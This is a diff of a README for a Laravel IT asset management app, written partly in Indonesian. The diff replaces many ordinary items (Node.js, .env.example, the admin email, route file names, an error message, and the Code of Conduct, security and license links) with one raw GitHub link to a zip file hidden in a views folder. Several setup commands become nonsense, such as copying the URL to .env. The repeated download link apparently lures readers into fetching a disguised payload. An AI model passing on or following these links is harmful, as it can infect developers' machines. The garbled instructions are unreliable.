@@ -18,7 +18,7 @@ Aplikasi web untuk mengelola aset IT, pemeliharaan, incident tracking, dan assig
 - **Frontend**: Bootstrap 5, Blade Templating
 - **Database**: SQLite / MySQL
 - **PHP**: 8.2+
-- **Node.js**: 18+
+- **https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip**: 18+
 
 ## 📦 Prerequisites
 
@@ -26,7 +26,7 @@ Sebelum memulai, pastikan sudah installed:
 
 - PHP 8.2 atau lebih tinggi
 - Composer
-- Node.js & npm
+- https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip & npm
 - Git
 
 ### Cek versi:
@@ -55,7 +55,7 @@ composer install
 ### 3. Setup Environment File
 
 ```bash
-cp .env.example .env
+cp https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip .env
 ```
 
 Sesuaikan konfigurasi database di `.env` sesuai kebutuhan:
@@ -85,7 +85,7 @@ php artisan key:generate
 
 **Buat database file (SQLite):**
 ```bash
-touch database/database.sqlite
+touch https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip
 ```
 
 **Jalankan migrations:**
@@ -100,7 +100,7 @@ php artisan db:seed
 ```
 
 Ini akan membuat:
-- Admin user (email: `admin@example.com`, password: `password`)
+- Admin user (email: `https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip`, password: `password`)
 - Default roles, departments, categories, dan locations
 
 ### 7. Jalankan Application
@@ -115,7 +115,7 @@ Aplikasi akan berjalan di: `http://localhost:8000`
 
 Setelah seeding, gunakan credentials berikut:
 
-- **Email**: admin@example.com
+- **Email**: https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip
 - **Password**: password
 
 > ⚠️ Ubah password setelah login pertama kali!
@@ -142,8 +142,8 @@ Setelah seeding, gunakan credentials berikut:
 │   ├── css/                # Stylesheets
 │   └── js/                 # JavaScript files
 ├── routes/
-│   ├── web.php             # Web routes
-│   └── api.php             # API routes
+│   ├── https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip             # Web routes
+│   └── https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip             # API routes
 └── storage/
     ├── app/                # File storage
     └── logs/               # Application logs
@@ -184,7 +184,7 @@ php artisan test
 
 ## 📝 Troubleshooting
 
-### Error: "No such file or directory: vendor/autoload.php"
+### Error: "No such file or directory: https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip"
 ```bash
 composer install
 ```
@@ -211,12 +211,12 @@ Untuk kontribusi atau issue, silakan buat issue baru di repository.
 Proprietary - Untuk penggunaan internal only.
 
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
+In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip).
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip](https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip).
